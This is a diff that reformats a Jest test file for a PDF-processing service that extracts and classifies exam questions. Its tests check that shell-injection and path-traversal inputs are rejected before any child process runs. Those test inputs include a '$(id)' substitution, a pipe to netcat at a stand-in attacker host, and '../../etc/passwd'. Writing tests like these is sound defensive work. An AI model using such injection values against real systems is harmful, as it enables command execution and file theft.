@@ -23,7 +23,8 @@ import { PdfProcessorService } from './pdf-processor.service';
 const gatewayStub = { emitProgress: jest.fn() } as any;
 
 /** A buffer that passes the %PDF- magic-byte check. */
-const pdfBuffer = (body = 'x'.repeat(200)) => Buffer.from(`%PDF-1.7\n${body}`, 'latin1');
+const pdfBuffer = (body = 'x'.repeat(200)) =>
+  Buffer.from(`%PDF-1.7\n${body}`, 'latin1');
 
 describe('PdfProcessorService', () => {
   let service: PdfProcessorService;
@@ -47,26 +48,33 @@ describe('PdfProcessorService', () => {
       'jee$(id)',
       'jee | nc attacker 4444',
       '../../etc/passwd',
-    ])('rejects %p rather than passing it to a child process', async (examType) => {
-      await expect(service.processPdf(pdfBuffer(), 'teacher-1', examType)).rejects.toBeInstanceOf(
-        BadRequestException,
-      );
+    ])(
+      'rejects %p rather than passing it to a child process',
+      async (examType) => {
+        await expect(
+          service.processPdf(pdfBuffer(), 'teacher-1', examType),
+        ).rejects.toBeInstanceOf(BadRequestException);
 
-      expect(execFileMock).not.toHaveBeenCalled();
-    });
+        expect(execFileMock).not.toHaveBeenCalled();
+      },
+    );
 
     it.each(['jee', 'neet', 'cbse', 'general', 'JEE', ' neet '])(
       'accepts the supported taxonomy %p',
       async (examType) => {
         // Extraction runs, then the manifest read fails — which is fine: by then
         // the argument handling under test has already happened.
-        await expect(service.processPdf(pdfBuffer(), 'teacher-1', examType)).rejects.toBeDefined();
+        await expect(
+          service.processPdf(pdfBuffer(), 'teacher-1', examType),
+        ).rejects.toBeDefined();
         expect(execFileMock).toHaveBeenCalled();
       },
     );
 
     it('passes arguments as an argv array with no shell', async () => {
-      await service.processPdf(pdfBuffer(), 'teacher-1', 'neet').catch(() => undefined);
+      await service
+        .processPdf(pdfBuffer(), 'teacher-1', 'neet')
+        .catch(() => undefined);
 
       // First call is extract.py, second is classify.py.
       expect(execFileMock).toHaveBeenCalledTimes(2);
@@ -83,15 +91,19 @@ describe('PdfProcessorService', () => {
 
   describe('file validation', () => {
     it('refuses an empty upload', async () => {
-      await expect(service.processPdf(Buffer.alloc(0), 'teacher-1', 'jee')).rejects.toThrow(
-        /no pdf/i,
-      );
+      await expect(
+        service.processPdf(Buffer.alloc(0), 'teacher-1', 'jee'),
+      ).rejects.toThrow(/no pdf/i);
     });
 
     /** A renamed .exe still has the wrong magic bytes. */
     it('refuses a file that is not actually a PDF', async () => {
       await expect(
-        service.processPdf(Buffer.from('MZ\x90\x00 not a pdf'), 'teacher-1', 'jee'),
+        service.processPdf(
+          Buffer.from('MZ\x90\x00 not a pdf'),
+          'teacher-1',
+          'jee',
+        ),
       ).rejects.toThrow(/not a pdf/i);
 
       expect(execFileMock).not.toHaveBeenCalled();
@@ -108,7 +120,12 @@ describe('PdfProcessorService', () => {
     });
 
     it('accepts a path that stays inside', () => {
-      expect(resolveInside('/runs/abc', 'classified/Physics/Optics/numerical/q1.png')).toBeTruthy();
+      expect(
+        resolveInside(
+          '/runs/abc',
+          'classified/Physics/Optics/numerical/q1.png',
+        ),
+      ).toBeTruthy();
     });
   });
 
@@ -120,7 +137,8 @@ describe('PdfProcessorService', () => {
    * insert and fail the whole batch.
    */
   describe('resolveQuestionType', () => {
-    const resolve = (value: unknown) => (service as any).resolveQuestionType(value);
+    const resolve = (value: unknown) =>
+      (service as any).resolveQuestionType(value);
 
     it.each(['single_correct', 'multi_correct', 'numerical', 'assertion'])(
       'keeps the supported type %p',
@@ -142,18 +160,25 @@ describe('PdfProcessorService', () => {
   });
 
   describe('buildCorrectAnswer', () => {
-    const build = (qType: string, item: any) => (service as any).buildCorrectAnswer(qType, item);
+    const build = (qType: string, item: any) =>
+      (service as any).buildCorrectAnswer(qType, item);
 
     it('gives a multi-correct question the indices shape the grader matches on', () => {
-      expect(build('multi_correct', { answer_indices: [0, 2] })).toEqual({ indices: [0, 2] });
+      expect(build('multi_correct', { answer_indices: [0, 2] })).toEqual({
+        indices: [0, 2],
+      });
     });
 
     it('gives a numerical question the printed value', () => {
-      expect(build('numerical', { answer_value: '2.50' })).toEqual({ value: '2.50' });
+      expect(build('numerical', { answer_value: '2.50' })).toEqual({
+        value: '2.50',
+      });
     });
 
     it('gives a single-correct question the first answered index', () => {
-      expect(build('single_correct', { answer_indices: [1] })).toEqual({ index: 1 });
+      expect(build('single_correct', { answer_indices: [1] })).toEqual({
+        index: 1,
+      });
     });
 
     /** No printed answer key: the reviewer supplies it before approval. */
